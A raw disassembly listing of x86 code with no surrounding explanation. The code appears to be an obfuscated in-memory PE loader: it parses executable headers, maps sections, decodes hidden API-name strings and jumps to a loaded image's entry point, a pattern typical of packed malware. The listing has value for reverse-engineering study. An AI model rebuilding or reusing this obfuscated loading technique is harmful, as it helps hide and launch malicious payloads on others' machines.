  41ed01:	mov    ax,WORD PTR [ebp+0x20]
  41ed05:	mov    ecx,0x8a8d
  41ed0a:	xor    ax,cx
  41ed0d:	mov    ecx,0x3b51
  41ed12:	add    ax,cx
  41ed15:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed18:	cmp    WORD PTR [ecx],ax
  41ed1b:	jne    0x41f140
  41ed21:	mov    eax,DWORD PTR [ebp-0x4]
  41ed24:	xor    eax,esi
  41ed26:	add    eax,edi
  41ed28:	mov    DWORD PTR [ebp-0x30],eax
  41ed2b:	mov    eax,DWORD PTR [ebp-0x4]
  41ed2e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed31:	mov    eax,DWORD PTR [ebp+0x8]
  41ed34:	add    eax,DWORD PTR [ecx+0x3c]
  41ed37:	mov    DWORD PTR [ebp+0xc],eax
  41ed3a:	mov    eax,DWORD PTR [eax+0x50]
  41ed3d:	test   eax,eax
  41ed3f:	je     0x41f140
  41ed45:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  41ed4c:	mov    eax,DWORD PTR [ebp-0x2c]
  41ed4f:	xor    eax,esi
  41ed51:	add    eax,edi
  41ed53:	mov    DWORD PTR [ebp-0x2c],eax
  41ed56:	mov    eax,DWORD PTR [ebp-0x4]
  41ed59:	mov    eax,DWORD PTR [ebx+0x190]
  41ed5f:	mov    ecx,DWORD PTR [eax]
  41ed61:	mov    ecx,DWORD PTR [ecx+0x3c]
  41ed64:	add    ecx,DWORD PTR [eax]
  41ed66:	mov    eax,DWORD PTR [ebp-0x4]
  41ed69:	mov    eax,DWORD PTR [ebx+0x18c]
  41ed6f:	mov    edx,DWORD PTR [eax]
  41ed71:	mov    DWORD PTR [ebp-0x18],ecx
  41ed74:	mov    DWORD PTR [ebp+0x20],edx
  41ed77:	cmp    edx,edx
  41ed79:	jne    0x41edad
  41ed7b:	mov    eax,DWORD PTR [ebx+0x1d8]
  41ed81:	lea    edx,[ebp-0x1c]
  41ed84:	push   edx
  41ed85:	mov    edx,DWORD PTR [ebp-0xc]
  41ed88:	xor    edx,esi
  41ed8a:	add    edx,edi
  41ed8c:	push   edx
  41ed8d:	push   DWORD PTR [ecx+0x50]
  41ed90:	push   DWORD PTR [ebp+0x20]
  41ed93:	call   DWORD PTR [eax+0x1c]
  41ed96:	mov    eax,DWORD PTR [ebp-0x18]
  41ed99:	mov    ecx,DWORD PTR [eax+0x54]
  41ed9c:	mov    eax,DWORD PTR [eax+0x50]
  41ed9f:	sub    eax,ecx
  41eda1:	add    ecx,DWORD PTR [ebp+0x20]
  41eda4:	push   ecx
  41eda5:	call   0x41f72c
  41edaa:	mov    edx,DWORD PTR [ebp+0x20]
  41edad:	mov    eax,DWORD PTR [ebx+0x194]
  41edb3:	mov    DWORD PTR [eax],edx
  41edb5:	mov    eax,DWORD PTR [ebp+0xc]
  41edb8:	push   DWORD PTR [eax+0x54]
  41edbb:	push   DWORD PTR [ebp+0x8]
  41edbe:	push   edx
  41edbf:	call   0x41f5d3
  41edc4:	mov    ecx,DWORD PTR [ebp+0x20]
  41edc7:	mov    eax,DWORD PTR [ecx+0x3c]
  41edca:	add    eax,ecx
  41edcc:	movzx  ecx,WORD PTR [eax+0x14]
  41edd0:	lea    ecx,[ecx+eax*1+0x18]
  41edd4:	mov    DWORD PTR [ebp+0x18],ecx
  41edd7:	mov    ecx,DWORD PTR [ebp-0x4]
  41edda:	movzx  edx,WORD PTR [eax+0x6]
  41edde:	xor    ecx,esi
  41ede0:	add    ecx,edi
  41ede2:	mov    DWORD PTR [ebp+0xc],eax
  41ede5:	cmp    edx,ecx
  41ede7:	je     0x41ee94
  41eded:	mov    ecx,DWORD PTR [ebp-0x4]
  41edf0:	xor    ecx,esi
  41edf2:	add    ecx,edi
  41edf4:	mov    DWORD PTR [ebp-0x8],ecx
  41edf7:	mov    ecx,DWORD PTR [ebp-0x24]
  41edfa:	movzx  edx,WORD PTR [eax+0x6]
  41edfe:	xor    ecx,esi
  41ee00:	sub    edx,ecx
  41ee02:	sub    edx,edi
  41ee04:	cmp    DWORD PTR [ebp-0x8],edx
  41ee07:	ja     0x41ee94
  41ee0d:	mov    edx,DWORD PTR [ebp+0x18]
  41ee10:	add    edx,0x8
  41ee13:	mov    DWORD PTR [ebp+0x18],edx
  41ee16:	jmp    0x41ee1b
  41ee18:	mov    edx,DWORD PTR [ebp+0x18]
  41ee1b:	mov    eax,DWORD PTR [eax+0x38]
  41ee1e:	lea    ecx,[eax-0x1]
  41ee21:	mov    DWORD PTR [ebp-0x34],eax
  41ee24:	mov    eax,DWORD PTR [edx]
  41ee26:	test   ecx,eax
  41ee28:	je     0x41ee31
  41ee2a:	not    ecx
  41ee2c:	and    eax,ecx
  41ee2e:	add    eax,DWORD PTR [ebp-0x34]
  41ee31:	mov    ecx,DWORD PTR [edx+0x4]
  41ee34:	add    ecx,DWORD PTR [ebp+0x20]
  41ee37:	push   ecx
  41ee38:	call   0x41f72c
  41ee3d:	mov    edx,DWORD PTR [ebp-0x4]
  41ee40:	mov    eax,DWORD PTR [ebp+0x18]
  41ee43:	mov    ecx,DWORD PTR [eax+0x8]
  41ee46:	xor    edx,esi
  41ee48:	add    edx,edi
  41ee4a:	cmp    ecx,edx
  41ee4c:	je     0x41ee65
  41ee4e:	push   ecx
  41ee4f:	mov    ecx,DWORD PTR [ebp+0x8]
  41ee52:	add    ecx,DWORD PTR [eax+0xc]
  41ee55:	mov    eax,DWORD PTR [eax+0x4]
  41ee58:	add    eax,DWORD PTR [ebp+0x20]
  41ee5b:	push   ecx
  41ee5c:	push   eax
  41ee5d:	call   0x41f5d3
  41ee62:	mov    eax,DWORD PTR [ebp+0x18]
  41ee65:	mov    ecx,DWORD PTR [ebp-0x24]
  41ee68:	mov    edx,DWORD PTR [ebp-0x8]
  41ee6b:	add    eax,0x28
  41ee6e:	xor    ecx,esi
  41ee70:	lea    ecx,[edx+ecx*1+0x3272e2]
  41ee77:	mov    edx,DWORD PTR [ebp+0xc]
  41ee7a:	mov    DWORD PTR [ebp+0x18],eax
  41ee7d:	mov    eax,DWORD PTR [ebp-0x24]
  41ee80:	movzx  edx,WORD PTR [edx+0x6]
  41ee84:	xor    eax,esi
  41ee86:	sub    edx,eax
  41ee88:	mov    eax,DWORD PTR [ebp+0xc]
  41ee8b:	sub    edx,edi
  41ee8d:	mov    DWORD PTR [ebp-0x8],ecx
  41ee90:	cmp    ecx,edx
  41ee92:	jbe    0x41ee18
  41ee94:	mov    edx,DWORD PTR [ebx+0x18c]
  41ee9a:	mov    ecx,DWORD PTR [ebp+0x20]
  41ee9d:	cmp    ecx,DWORD PTR [edx]
  41ee9f:	jne    0x41eec8
  41eea1:	mov    eax,DWORD PTR [ebx+0x1d8]
  41eea7:	lea    edx,[ebp-0x1c]
  41eeaa:	push   edx
  41eeab:	mov    edx,DWORD PTR [ebp-0x10]
  41eeae:	xor    edx,esi
  41eeb0:	add    edx,edi
  41eeb2:	push   edx
  41eeb3:	mov    edx,DWORD PTR [ebp-0x18]
  41eeb6:	push   DWORD PTR [edx+0x54]
  41eeb9:	push   ecx
  41eeba:	call   DWORD PTR [eax+0x1c]
  41eebd:	test   eax,eax
  41eebf:	je     0x41f131
  41eec5:	mov    eax,DWORD PTR [ebp+0xc]
  41eec8:	mov    ecx,DWORD PTR [ebx+0x1c8]
  41eece:	mov    ecx,DWORD PTR [ecx]
  41eed0:	xor    ecx,esi
  41eed2:	add    ecx,edi
  41eed4:	je     0x41f05c
  41eeda:	and    DWORD PTR [ebp-0x28],0x0
  41eede:	and    DWORD PTR [ebp+0x8],0x0
  41eee2:	mov    eax,0xf89c8519
  41eee7:	lea    ecx,[eax-0x8]
  41eeea:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  41eef1:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41eef8:	mov    DWORD PTR [ebp-0x44],eax
  41eefb:	mov    DWORD PTR [ebp-0x40],ecx
  41eefe:	mov    DWORD PTR [ebp-0x3c],ecx
  41ef01:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41ef08:	mov    edx,DWORD PTR [ebp+0x8]
  41ef0b:	mov    ecx,0x89b
  41ef10:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41ef15:	mov    edx,0x72e2
  41ef1a:	add    cx,dx
  41ef1d:	mov    edx,DWORD PTR [ebp+0x8]
  41ef20:	inc    DWORD PTR [ebp+0x8]
  41ef23:	cmp    DWORD PTR [ebp+0x8],0x6
  41ef27:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  41ef2f:	jb     0x41ef08
  41ef31:	mov    ecx,0xf89c850b
  41ef36:	mov    DWORD PTR [ebp-0xa4],eax
  41ef3c:	mov    DWORD PTR [ebp-0x90],eax
  41ef42:	mov    DWORD PTR [ebp-0x68],eax
  41ef45:	mov    DWORD PTR [ebp-0x64],eax
  41ef48:	lea    eax,[ecx-0x1]
  41ef4b:	mov    edx,0xf89c85ff
  41ef50:	mov    DWORD PTR [ebp-0x58],eax
  41ef53:	mov    DWORD PTR [ebp-0x54],eax
  41ef56:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  41ef60:	mov    DWORD PTR [ebp-0xa0],ecx
  41ef66:	mov    DWORD PTR [ebp-0x9c],edx
  41ef6c:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  41ef76:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  41ef80:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  41ef8a:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41ef94:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  41ef9e:	mov    DWORD PTR [ebp-0x80],ecx
  41efa1:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41efa8:	mov    DWORD PTR [ebp-0x78],edx
  41efab:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  41efb2:	mov    DWORD PTR [ebp-0x70],ecx
  41efb5:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  41efbc:	mov    DWORD PTR [ebp-0x60],ecx
  41efbf:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41efc6:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  41efcd:	xor    eax,eax
  41efcf:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41efd6:	xor    cl,0x9b
  41efd9:	sub    cl,0x1e
  41efdc:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41efe3:	inc    eax
  41efe4:	cmp    eax,0x17
  41efe7:	jb     0x41efcf
  41efe9:	mov    eax,DWORD PTR [ebx+0x1d8]
  41efef:	lea    ecx,[ebp-0xb4]
  41eff5:	push   ecx
  41eff6:	call   DWORD PTR [eax+0x4]
  41eff9:	mov    ecx,DWORD PTR [ebx+0x1d8]
  41efff:	lea    edx,[ebp-0xcc]
  41f005:	push   edx
  41f006:	push   eax
  41f007:	call   DWORD PTR [ecx+0x8]
  41f00a:	lea    ecx,[ebp-0x28]
  41f00d:	push   ecx
  41f00e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f014:	push   DWORD PTR [ecx]
  41f016:	call   eax
  41f018:	mov    eax,DWORD PTR [ebp-0x28]
  41f01b:	test   eax,eax
  41f01d:	je     0x41f059
  41f01f:	mov    DWORD PTR [ebp+0x8],eax
  41f022:	jmp    0x41f02e
  41f024:	mov    eax,DWORD PTR [eax]
  41f026:	mov    DWORD PTR [ebp-0x28],eax
  41f029:	cmp    eax,DWORD PTR [ebp+0x8]
  41f02c:	je     0x41f03b
  41f02e:	mov    edx,DWORD PTR [eax+0x18]
  41f031:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f037:	cmp    edx,DWORD PTR [ecx]
  41f039:	jne    0x41f024
  41f03b:	mov    edx,DWORD PTR [eax+0x18]
  41f03e:	mov    ecx,DWORD PTR [ebx+0x18c]
  41f044:	cmp    edx,DWORD PTR [ecx]
  41f046:	jne    0x41f059
  41f048:	mov    edx,DWORD PTR [ebp-0x18]
  41f04b:	mov    ecx,DWORD PTR [ebx+0x190]
  41f051:	mov    edx,DWORD PTR [edx+0x28]
  41f054:	add    edx,DWORD PTR [ecx]
  41f056:	mov    DWORD PTR [eax+0x1c],edx
  41f059:	mov    eax,DWORD PTR [ebp+0xc]
  41f05c:	push   ebx
  41f05d:	push   eax
  41f05e:	push   DWORD PTR [ebp+0x20]
  41f061:	call   0x41e80b
  41f066:	test   eax,eax
  41f068:	je     0x41f131
  41f06e:	push   DWORD PTR [ebp+0xc]
  41f071:	mov    ecx,ebx
  41f073:	push   DWORD PTR [ebp+0x20]
  41f076:	call   0x41e764
  41f07b:	test   eax,eax
  41f07d:	je     0x41f131
  41f083:	mov    eax,DWORD PTR [ebp+0xc]
  41f086:	mov    edx,DWORD PTR [ebp+0x20]
  41f089:	mov    ecx,ebx
  41f08b:	call   0x41e63d
  41f090:	test   eax,eax
  41f092:	je     0x41f131
  41f098:	push   ebx
  41f099:	push   DWORD PTR [ebp+0x20]
  41f09c:	call   0x41eaee
  41f0a1:	test   eax,eax
  41f0a3:	je     0x41f131
  41f0a9:	mov    eax,DWORD PTR [ebx+0x18c]
  41f0af:	mov    edx,DWORD PTR [ebp+0x20]
  41f0b2:	cmp    edx,DWORD PTR [eax]
  41f0b4:	jne    0x41f0d0
  41f0b6:	mov    eax,DWORD PTR [ebx+0x1d8]
  41f0bc:	lea    ecx,[ebp-0x1c]
  41f0bf:	push   ecx
  41f0c0:	push   DWORD PTR [ebp-0x1c]
  41f0c3:	mov    ecx,DWORD PTR [ebp-0x18]
  41f0c6:	push   DWORD PTR [ecx+0x54]
  41f0c9:	push   edx
  41f0ca:	call   DWORD PTR [eax+0x1c]
  41f0cd:	mov    edx,DWORD PTR [ebp+0x20]
  41f0d0:	mov    eax,DWORD PTR [ebx+0x1c8]
  41f0d6:	mov    eax,DWORD PTR [eax]
  41f0d8:	xor    eax,esi
  41f0da:	add    eax,edi
  41f0dc:	je     0x41f115
  41f0de:	mov    ecx,DWORD PTR [ebp+0xc]
  41f0e1:	mov    eax,DWORD PTR [ecx+0x28]
  41f0e4:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  41f0eb:	mov    esi,DWORD PTR [ebp+0x8]
  41f0ee:	push   DWORD PTR [ebp+0x14]
  41f0f1:	xor    esi,0x89b
  41f0f7:	push   DWORD PTR [ebp+0x10]
  41f0fa:	add    esi,0x72e2
  41f100:	or     WORD PTR [ecx+0x16],si
  41f104:	add    eax,edx
  41f106:	push   edx
  41f107:	call   eax
  41f109:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41f113:	jmp    0x41f11f
  41f115:	mov    eax,DWORD PTR [ebp+0xc]
  41f118:	mov    eax,DWORD PTR [eax+0x28]
  41f11b:	add    eax,edx
  41f11d:	call   eax
  41f11f:	mov    DWORD PTR [ebp-0x8],eax
  41f122:	mov    eax,DWORD PTR [ebp-0x8]
  41f125:	mov    ecx,DWORD PTR [ebp+0x1c]
  41f128:	mov    DWORD PTR [ecx],eax
  41f12a:	mov    DWORD PTR [ebp-0x30],0x1
  41f131:	cmp    DWORD PTR [ebp-0x30],0x0
  41f135:	jne    0x41f13b
  41f137:	and    DWORD PTR [ebp+0x20],0x0
  41f13b:	mov    eax,DWORD PTR [ebp+0x20]
  41f13e:	jmp    0x41f142
  41f140:	xor    eax,eax
  41f142:	pop    edi
  41f143:	pop    esi
  41f144:	pop    ebx
  41f145:	leave  
  41f146:	ret    0x1c
  41f149:	push   ebp
  41f14a:	mov    ebp,esp
  41f14c:	movzx  edx,WORD PTR [ecx+0x6]
  41f150:	movzx  eax,WORD PTR [ecx+0x14]
  41f154:	push   ebx
  41f155:	push   edi
  41f156:	xor    edi,edi
  41f158:	lea    eax,[eax+ecx*1+0x18]
  41f15c:	test   edx,edx
  41f15e:	je     0x41f17f
  41f160:	mov    ecx,DWORD PTR [eax+0xc]
  41f163:	lea    ebx,[ecx+esi*1]
  41f166:	cmp    DWORD PTR [ebp+0x8],ebx
  41f169:	jb     0x41f177
  41f16b:	mov    ebx,DWORD PTR [eax+0x8]
  41f16e:	add    ebx,ecx
  41f170:	add    ebx,esi
  41f172:	cmp    DWORD PTR [ebp+0x8],ebx
  41f175:	jb     0x41f181
  41f177:	add    eax,0x28
  41f17a:	inc    edi
  41f17b:	cmp    edi,edx
  41f17d:	jb     0x41f160
  41f17f:	xor    eax,eax
  41f181:	pop    edi
  41f182:	pop    ebx
  41f183:	pop    ebp
  41f184:	ret    0x4
  41f187:	push   ebp
  41f188:	mov    ebp,esp
  41f18a:	sub    esp,0x34
  41f18d:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41f194:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41f19b:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  41f1a2:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  41f1a9:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  41f1b0:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  41f1b7:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  41f1be:	mov    DWORD PTR [ebp-0x10],eax
  41f1c1:	mov    eax,DWORD PTR [ebp+0x8]
  41f1c4:	mov    DWORD PTR [ebp-0x14],eax
  41f1c7:	mov    eax,DWORD PTR [ebp-0xc]
  41f1ca:	push   ebx
  41f1cb:	mov    ecx,0x751089b
  41f1d0:	xor    eax,ecx
  41f1d2:	push   esi
  41f1d3:	mov    esi,DWORD PTR [ebp-0x10]
  41f1d6:	mov    edx,0x3272e2
  41f1db:	add    eax,edx
  41f1dd:	push   edi
  41f1de:	cmp    esi,eax
  41f1e0:	je     0x41f3bf
  41f1e6:	mov    eax,DWORD PTR [ebp-0xc]
  41f1e9:	mov    esi,DWORD PTR [ebp-0x14]
  41f1ec:	xor    eax,ecx
  41f1ee:	add    eax,edx
  41f1f0:	cmp    esi,eax
  41f1f2:	je     0x41f3bf
  41f1f8:	mov    eax,DWORD PTR [ebp-0xc]
  41f1fb:	xor    eax,ecx
  41f1fd:	add    eax,edx
  41f1ff:	mov    DWORD PTR [ebp-0x24],eax
  41f202:	mov    eax,DWORD PTR [ebp-0xc]
  41f205:	xor    eax,ecx
  41f207:	add    eax,edx
  41f209:	mov    DWORD PTR [ebp-0x28],eax
  41f20c:	mov    edi,DWORD PTR [ebp-0x20]
  41f20f:	mov    ebx,DWORD PTR [ebp-0x8]
  41f212:	mov    esi,0x89b
  41f217:	xor    edi,esi
  41f219:	mov    eax,0x72e2
  41f21e:	xor    ebx,esi
  41f220:	add    edi,eax
  41f222:	add    ebx,eax
  41f224:	sub    ebx,edi
  41f226:	mov    WORD PTR [ebp-0x8],bx
  41f22a:	jmp    0x41f2ef
  41f22f:	mov    edi,DWORD PTR [ebp-0xc]
  41f232:	mov    bx,WORD PTR [ebp-0x4]
  41f236:	xor    edi,esi
  41f238:	add    edi,eax
  41f23a:	cmp    bx,di
  41f23d:	je     0x41f331
  41f243:	mov    edi,DWORD PTR [ebp-0xc]
  41f246:	mov    ebx,DWORD PTR [ebp+0xc]
  41f249:	xor    edi,ecx
  41f24b:	add    edi,edx
  41f24d:	cmp    ebx,edi
  41f24f:	mov    di,WORD PTR [ebp-0x4]
  41f253:	mov    bx,WORD PTR [ebp+0x8]
  41f257:	je     0x41f2c2
  41f259:	cmp    bx,di
  41f25c:	je     0x41f2cb
  41f25e:	mov    edi,DWORD PTR [ebp-0x20]
  41f261:	mov    bx,WORD PTR [ebp+0x8]
  41f265:	xor    edi,esi
  41f267:	add    edi,eax
  41f269:	cmp    bx,di
  41f26c:	jb     0x41f28c
  41f26e:	mov    edi,DWORD PTR [ebp-0x2c]
  41f271:	mov    bx,WORD PTR [ebp+0x8]
  41f275:	xor    edi,esi
  41f277:	add    edi,eax
  41f279:	cmp    bx,di
  41f27c:	ja     0x41f28c
  41f27e:	movzx  edi,WORD PTR [ebp+0x8]
  41f282:	movzx  ebx,WORD PTR [ebp-0x8]
  41f286:	add    edi,ebx
  41f288:	mov    WORD PTR [ebp+0x8],di
  41f28c:	mov    edi,DWORD PTR [ebp-0x20]
  41f28f:	mov    bx,WORD PTR [ebp-0x4]
  41f293:	xor    edi,esi
  41f295:	add    edi,eax
  41f297:	cmp    bx,di
  41f29a:	jb     0x41f2ba
  41f29c:	mov    edi,DWORD PTR [ebp-0x2c]
  41f29f:	mov    bx,WORD PTR [ebp-0x4]
  41f2a3:	xor    edi,esi
  41f2a5:	add    edi,eax
  41f2a7:	cmp    bx,di
  41f2aa:	ja     0x41f2ba
  41f2ac:	movzx  edi,WORD PTR [ebp-0x4]
  41f2b0:	movzx  ebx,WORD PTR [ebp-0x8]
  41f2b4:	add    edi,ebx
  41f2b6:	mov    WORD PTR [ebp-0x4],di
  41f2ba:	mov    di,WORD PTR [ebp-0x4]
  41f2be:	mov    bx,WORD PTR [ebp+0x8]
  41f2c2:	cmp    bx,di
  41f2c5:	jne    0x41f3bf
  41f2cb:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2ce:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2d1:	xor    edi,ecx
  41f2d3:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2da:	mov    DWORD PTR [ebp-0x10],edi
  41f2dd:	mov    edi,DWORD PTR [ebp-0x1c]
  41f2e0:	mov    ebx,DWORD PTR [ebp-0x14]
  41f2e3:	xor    edi,ecx
  41f2e5:	lea    edi,[edi+ebx*1+0x3272e2]
  41f2ec:	mov    DWORD PTR [ebp-0x14],edi
  41f2ef:	mov    edi,DWORD PTR [ebp-0x24]
  41f2f2:	mov    ebx,DWORD PTR [ebp-0x10]
  41f2f5:	mov    di,WORD PTR [ebx+edi*2]
  41f2f9:	mov    WORD PTR [ebp+0x8],di
  41f2fd:	mov    edi,DWORD PTR [ebp-0x28]
  41f300:	mov    ebx,DWORD PTR [ebp-0x14]
  41f303:	mov    di,WORD PTR [ebx+edi*2]
  41f307:	mov    WORD PTR [ebp-0x4],di
  41f30b:	mov    edi,DWORD PTR [ebp-0xc]
  41f30e:	mov    bx,WORD PTR [ebp+0x8]
  41f312:	xor    edi,esi
  41f314:	add    edi,eax
  41f316:	cmp    bx,di
  41f319:	jne    0x41f22f
  41f31f:	mov    eax,DWORD PTR [ebp-0x18]
  41f322:	mov    esi,DWORD PTR [ebp-0xc]
  41f325:	xor    eax,ecx
  41f327:	add    eax,edx
  41f329:	imul   eax,esi
  41f32c:	mov    DWORD PTR [ebp-0xc],eax
  41f32f:	jmp    0x41f343
  41f331:	mov    eax,DWORD PTR [ebp-0xc]
  41f334:	mov    esi,DWORD PTR [ebp-0x18]
  41f337:	xor    eax,ecx
  41f339:	lea    eax,[eax+esi*1+0x3272e2]
  41f340:	mov    DWORD PTR [ebp-0x18],eax
  41f343:	mov    eax,DWORD PTR [ebp-0x24]
  41f346:	sub    eax,edx
  41f348:	xor    eax,ecx
  41f34a:	mov    DWORD PTR [ebp-0x30],eax
  41f34d:	mov    eax,DWORD PTR [ebp-0x28]
  41f350:	sub    eax,edx
  41f352:	xor    eax,ecx
  41f354:	mov    DWORD PTR [ebp-0x34],eax
  41f357:	mov    eax,DWORD PTR [ebp-0x34]
  41f35a:	mov    esi,DWORD PTR [ebp-0x1c]
  41f35d:	xor    esi,ecx
  41f35f:	add    esi,edx
  41f361:	xor    eax,ecx
  41f363:	add    eax,0x3272e2
  41f368:	imul   esi,eax
  41f36b:	mov    eax,DWORD PTR [ebp-0x14]
  41f36e:	movzx  eax,WORD PTR [esi+eax*1]
  41f372:	mov    esi,DWORD PTR [ebp-0x30]
  41f375:	mov    edi,DWORD PTR [ebp-0x1c]
  41f378:	xor    esi,ecx
  41f37a:	add    esi,edx
  41f37c:	xor    edi,ecx
  41f37e:	add    edi,edx
  41f380:	imul   edi,esi
  41f383:	mov    esi,DWORD PTR [ebp-0x10]
  41f386:	movzx  esi,WORD PTR [edi+esi*1]
  41f38a:	sub    eax,edx
  41f38c:	sub    esi,edx
  41f38e:	xor    eax,ecx
  41f390:	xor    esi,ecx
  41f392:	cmp    esi,eax
  41f394:	jne    0x41f3bf
  41f396:	mov    eax,DWORD PTR [ebp-0x30]
  41f399:	mov    esi,DWORD PTR [ebp-0x1c]
  41f39c:	xor    eax,ecx
  41f39e:	add    eax,0x3272e2
  41f3a3:	xor    esi,ecx
  41f3a5:	add    esi,edx
  41f3a7:	imul   esi,eax
  41f3aa:	mov    eax,DWORD PTR [ebp-0x10]
  41f3ad:	movzx  eax,WORD PTR [esi+eax*1]
  41f3b1:	mov    esi,DWORD PTR [ebp-0xc]
  41f3b4:	sub    eax,edx
  41f3b6:	xor    eax,ecx
  41f3b8:	cmp    eax,esi
  41f3ba:	mov    eax,DWORD PTR [ebp-0xc]
  41f3bd:	je     0x41f3c2
  41f3bf:	mov    eax,DWORD PTR [ebp-0x18]
  41f3c2:	pop    edi
  41f3c3:	xor    eax,ecx
  41f3c5:	pop    esi
  41f3c6:	add    eax,edx
  41f3c8:	pop    ebx
  41f3c9:	leave  
  41f3ca:	ret    0x8
  41f3cd:	push   ebp
  41f3ce:	mov    ebp,esp
  41f3d0:	push   ecx
  41f3d1:	mov    cx,WORD PTR [eax]
  41f3d4:	push   esi
  41f3d5:	mov    esi,0x3b51
  41f3da:	sub    cx,si
  41f3dd:	mov    esi,0x8a8d
  41f3e2:	xor    cx,si
  41f3e5:	mov    esi,0x4e22
  41f3ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f3f1:	mov    edx,0xf89c8585
  41f3f6:	cmp    cx,si
  41f3f9:	je     0x41f458
  41f3fb:	push   ebx
  41f3fc:	push   edi
  41f3fd:	movzx  ecx,cx
  41f400:	mov    edi,0xffcd8d1e
  41f405:	mov    esi,0x751089b
  41f40a:	mov    ebx,0x4f86
  41f40f:	cmp    cx,bx
  41f412:	jne    0x41f417
  41f414:	mov    DWORD PTR [ebp-0x4],edx
  41f417:	lea    edx,[edi+0x1]
  41f41a:	xor    edx,esi
  41f41c:	mov    edi,edx
  41f41e:	xor    edi,esi
  41f420:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  41f428:	mov    ebx,0x3b51
  41f42d:	sub    cx,bx
  41f430:	mov    ebx,0x8a8d
  41f435:	xor    cx,bx
  41f438:	mov    ebx,0x4e22
  41f43d:	cmp    cx,bx
  41f440:	jne    0x41f40a
  41f442:	mov    ecx,DWORD PTR [ebp-0x4]
  41f445:	pop    edi
  41f446:	pop    ebx
  41f447:	cmp    ecx,0xf89c8586
  41f44d:	je     0x41f458
  41f44f:	xor    ecx,esi
  41f451:	lea    eax,[eax+ecx*2+0x64e5c6]
  41f458:	pop    esi
  41f459:	leave  
  41f45a:	ret    
  41f45b:	push   ebp
  41f45c:	mov    ebp,esp
  41f45e:	push   ecx
  41f45f:	push   esi
  41f460:	push   edi
  41f461:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f468:	mov    esi,0xf89c8585
  41f46d:	call   0x41f3cd
  41f472:	mov    edi,eax
  41f474:	mov    al,BYTE PTR [edi]
  41f476:	add    al,0x8
  41f478:	xor    al,0x74
  41f47a:	cmp    al,0x7c
  41f47c:	je     0x41f4df
  41f47e:	mov    eax,edi
  41f480:	mov    edx,0xffcd8d1e
  41f485:	mov    ecx,0x751089b
  41f48a:	push   ebx
  41f48b:	mov    ax,WORD PTR [eax]
  41f48e:	mov    ebx,0x3b51
  41f493:	sub    ax,bx
  41f496:	mov    ebx,0x8a8d
  41f49b:	xor    ax,bx
  41f49e:	mov    ebx,0x4e50
  41f4a3:	cmp    ax,bx
  41f4a6:	jne    0x41f4ab
  41f4a8:	mov    DWORD PTR [ebp-0x4],esi
  41f4ab:	lea    esi,[edx+0x1]
  41f4ae:	xor    esi,ecx
  41f4b0:	mov    edx,esi
  41f4b2:	xor    edx,ecx
  41f4b4:	lea    eax,[edi+edx*2+0x64e5c4]
  41f4bb:	mov    bl,BYTE PTR [eax]
  41f4bd:	add    bl,0x8
  41f4c0:	xor    bl,0x74
  41f4c3:	cmp    bl,0x7c
  41f4c6:	jne    0x41f48b
  41f4c8:	mov    eax,DWORD PTR [ebp-0x4]
  41f4cb:	pop    ebx
  41f4cc:	cmp    eax,0xf89c8586
  41f4d1:	je     0x41f4df
  41f4d3:	xor    eax,ecx
  41f4d5:	xor    ecx,ecx
  41f4d7:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  41f4df:	mov    eax,edi
  41f4e1:	pop    edi
  41f4e2:	pop    esi
  41f4e3:	leave  
  41f4e4:	ret    
  41f4e5:	push   ebp
  41f4e6:	mov    ebp,esp
  41f4e8:	push   ecx
  41f4e9:	push   esi
  41f4ea:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  41f4f1:	mov    esi,0xf89c8585
  41f4f6:	call   0x41f3cd
  41f4fb:	mov    cx,WORD PTR [eax]
  41f4fe:	mov    edx,0x3b51
  41f503:	sub    cx,dx
  41f506:	mov    edx,0x8a8d
  41f50b:	xor    cx,dx
  41f50e:	mov    edx,0x4e22
  41f513:	cmp    cx,dx
  41f516:	je     0x41f56f
  41f518:	push   ebx
  41f519:	push   edi
  41f51a:	movzx  ecx,cx
  41f51d:	mov    edx,0xffcd8d1e
  41f522:	mov    edi,0x751089b
  41f527:	mov    ebx,0x4e50
  41f52c:	cmp    cx,bx
  41f52f:	jne    0x41f534
  41f531:	mov    DWORD PTR [ebp-0x4],esi
  41f534:	lea    esi,[edx+0x1]
  41f537:	xor    esi,edi
  41f539:	mov    edx,esi
  41f53b:	xor    edx,edi
  41f53d:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  41f545:	mov    ebx,0x3b51
  41f54a:	sub    cx,bx
  41f54d:	mov    ebx,0x8a8d
